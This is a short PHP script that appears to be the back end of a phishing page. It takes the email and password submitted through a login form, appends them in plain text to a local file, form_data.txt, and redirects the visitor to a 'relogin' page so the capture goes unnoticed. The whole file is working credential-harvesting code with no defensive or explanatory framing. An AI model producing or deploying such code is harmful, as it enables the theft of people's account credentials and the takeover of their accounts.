<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form inputs
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Format the data
    $data = "E-Mail: $email\nPassword: $password\n";

    // Write to file
    $file = fopen("form_data.txt", "a") or die("Unable to open file!");
    fwrite($file, $data);
    fclose($file);

    header("Location: relogin.html");
}
?>
